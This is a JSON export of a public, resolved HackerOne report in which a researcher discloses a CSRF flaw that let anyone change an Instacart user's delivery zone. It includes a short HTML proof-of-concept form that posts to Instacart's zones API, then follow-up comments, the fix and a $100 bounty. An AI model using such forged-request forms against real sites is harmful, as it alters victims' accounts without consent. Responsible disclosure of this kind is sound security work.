{"id":157993,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTc5OTM=","url":"https://hackerone.com/reports/157993","title":"Cross-Site Request Forgery (CSRF)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-09T21:52:49.883Z","submitted_at":"2016-08-09T21:52:49.883Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"malcolmx","url":"/malcolmx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":555,"url":"https://hackerone.com/instacart","handle":"instacart","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Instacart","twitter_handle":"instacart","website":"https://www.instacart.com/","about":"Same-day grocery delivery"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-10-13T20:21:53.860Z","bug_reporter_agreed_on_going_public_at":"2016-09-13T20:21:43.801Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\ni found Cross-Site Request Forgery (CSRF) that can change any user ZONE \n\nPOC:\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://admin.instacart.com/api/v2/zones\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"zip\" value=\"10001\" /\u003e\n      \u003cinput type=\"hidden\" name=\"override\" value=\"true\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n\n```\nput Zone you want send the request to any user and you will change his Zone\n\n__Please Watch My POC I Attached For More Details__\nThanks","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003ei found Cross-Site Request Forgery (CSRF) that can change any user ZONE \u003c/p\u003e\n\n\u003cp\u003ePOC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://admin.instacart.com/api/v2/zones\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;zip\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10001\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;override\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eput Zone you want send the request to any user and you will change his Zone\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePlease Watch My POC I Attached For More Details\u003c/strong\u003e\u003cbr\u003e\nThanks\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":110910,"file_name":"CSRF_Change_Any_User_Zone_POC.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/110/910/d14716e0c7393e7230adf8e30c205db79e1cc37c/CSRF_Change_Any_User_Zone_POC.mp4?response-content-disposition=attachment%3B%20filename%3D%22CSRF_Change_Any_User_Zone_POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27CSRF_Change_Any_User_Zone_POC.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZT5T356C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043546Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBcsqzm4YMyykC8pKAfuq22D6bSOUdyHaa8fIa4mUQhAAiEAiwPORMjouAw3a3uzUTZC%2BINQcpZp97MOQsVELFW4zLYqtAMIUBABGgwwMTM2MTkyNzQ4NDkiDKDiVMmiMU9V%2FMrmWyqRA4sIGIrOpHyvVZfmW2jMtAM8T%2B3ge7R5BW4DZ%2F780qW3KhtUb%2BlN4eJRg5WRaAT1yVb84a%2FkYNxsJD%2FuSvAe1wqOnVhU6s2QkIgwao%2BmXWZI5Gv75IeDf5AKwwqIEXhO%2BTfJ7qch1s5pk6yRn5dlzyaRdvpwfit2B%2BnXtVL4Ks0Z%2BsF2L1Sb9lQIKC%2FyiIIKOMM1XnEe09NuSw7Xf8Y6UOJpBJj7jLlVUmTMlaXhg0X5owu1jllReuJ1Ofketv8kjZlScgELVQhqeic8VvMdQFPk7uIxbwdUxI2D8U0mLOURF82HqwOSOvz3AjdFiUL5rInys31EjL5eLGhJJbviiWW1U6yAdtVgX5Dl9fG5sndUapgZ6tOzi5c%2FKiIqcs6TFB7V%2Ba94pbfE0ADF3Y25zJTundlOhWYZvSXJ2UVXh75JBOJYxsTgwZ5UgbsU6QjjUdK4ipM4ELoinryh%2FjoKyVb8ZjECBbMYtE22GC3vCLw7DmthiFcvoOPlRvKlah04sJNQ7b9KklIYWOG8BUX0xWhiMIC6qf8FOusB8i%2B4NEipXflNQqWCERI653SNHefieJr6qXk8vUjlyfvLnR2tXIQ%2FWyHufZZf0Rg4hKv79dttIkGWWsjFWimwSTHN9mTNskp6X9ZC4gvqOEnXuOZx%2Bxs2%2BUbYrNxuALH8x%2F%2FpM%2Fh0c4yBQF6OpSWOrWsdl5H%2BUIYyT8bSyRmCqToj58jXSS6GdhErBYuWCR9lbvOawRSwbxWyEGwvrNZPVRFC6gFj0nD1QwcZcdcCocD0zhQwtFu6F4LHGlpDLS8voy4%2BpFMo9RuKO1foe47wef9OHTulwBbLQCigHgaQeH2Lh7CupMWFI4rneA%3D%3D\u0026X-Amz-Signature=0d2f62848e073fad8822d8afdee12312e95809567314e4dfff33966fdfd8361c","file_size":4332929,"type":"video/mp4"}],"allow_singular_disclosure_at":"2016-10-13T20:21:43.914Z","allow_singular_disclosure_after":-132826442.28327784,"singular_disclosure_allowed":true,"vote_count":28,"voters":["flashdisk","supernatural","eveeez","r3y","everping","piyushmalik","s1ck-sec","m16","saeedhashem","ymy","and 18 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1116463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @anf  @instacart \nany response here\n\nThanks","markdown_message":"\u003cp\u003eHi \u003ca href=\"/anf\"\u003e@anf\u003c/a\u003e  \u003ca href=\"/instacart\"\u003e@instacart\u003c/a\u003e \u003cbr\u003e\nany response here\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-10T06:27:31.570Z","updated_at":"2016-08-10T06:27:31.570Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1116645,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey ,\n\nI just want to make sure that I'm not mistakenly forgotten ! .\n\nThanks\n","markdown_message":"\u003cp\u003eHey ,\u003c/p\u003e\n\n\u003cp\u003eI just want to make sure that I\u0026#39;m not mistakenly forgotten ! .\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-10T08:58:35.204Z","updated_at":"2016-08-10T08:58:35.204Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1117988,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nany response here?","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nany response here?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-10T20:32:05.624Z","updated_at":"2016-08-10T20:32:05.624Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1118881,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@anf\nPlease response here\n\nThanks","markdown_message":"\u003cp\u003e\u003ca href=\"/anf\"\u003e@anf\u003c/a\u003e\u003cbr\u003e\nPlease response here\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T08:49:46.128Z","updated_at":"2016-08-11T08:49:46.128Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1119603,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nwhy i did not get any response here?!\n\nThanks","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nwhy i did not get any response here?!\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T15:46:02.357Z","updated_at":"2016-08-11T15:46:02.357Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1119609,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, we are still going through the spike of reports we got when we opened our program.\nThanks for your patience, we will get back to you very soon.","markdown_message":"\u003cp\u003eThanks for the report, we are still going through the spike of reports we got when we opened our program.\u003cbr\u003e\nThanks for your patience, we will get back to you very soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T15:48:44.003Z","updated_at":"2016-08-11T15:48:44.003Z","actor":{"username":"anf","cleared":false,"url":"/anf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/569/6f3c5a7f7e76bc75a837f2b4ce698afe4e88d5e6_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1119618,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @anf \nyou was should Triaged it and not let my waiting \n\nThanks at all","markdown_message":"\u003cp\u003eHi \u003ca href=\"/anf\"\u003e@anf\u003c/a\u003e \u003cbr\u003e\nyou was should Triaged it and not let my waiting \u003c/p\u003e\n\n\u003cp\u003eThanks at all\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T15:51:36.797Z","updated_at":"2016-08-11T15:51:36.797Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1120688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@anf \nwhy you ignore me here? ","markdown_message":"\u003cp\u003e\u003ca href=\"/anf\"\u003e@anf\u003c/a\u003e \u003cbr\u003e\nwhy you ignore me here? \u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-11T23:23:58.541Z","updated_at":"2016-08-11T23:23:58.541Z","actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1120915,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @malcolmx! Thanks for your report, this should be resolved now. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/malcolmx\"\u003e@malcolmx\u003c/a\u003e! Thanks for your report, this should be resolved now. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-12T01:26:38.138Z","updated_at":"2016-08-12T01:26:38.138Z","actor":{"username":"mikeinstacart","cleared":false,"url":"/mikeinstacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1120917,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-12T01:26:49.296Z","updated_at":"2016-08-12T01:26:49.296Z","actor":{"username":"mikeinstacart","cleared":false,"url":"/mikeinstacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"malcolmx","url":"/malcolmx"},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1120919,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-12T01:28:07.069Z","updated_at":"2016-08-12T01:28:07.069Z","actor":{"url":"/instacart","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Instacart"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"instacart","collaborator":{"username":"malcolmx","url":"/malcolmx"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1192010,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-13T20:21:43.859Z","updated_at":"2016-09-13T20:21:43.859Z","first_to_agree":true,"actor":{"username":"malcolmx","cleared":true,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1246689,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-13T20:21:53.875Z","updated_at":"2016-10-13T20:21:53.875Z","actor":{"url":"/instacart","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Instacart"}},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}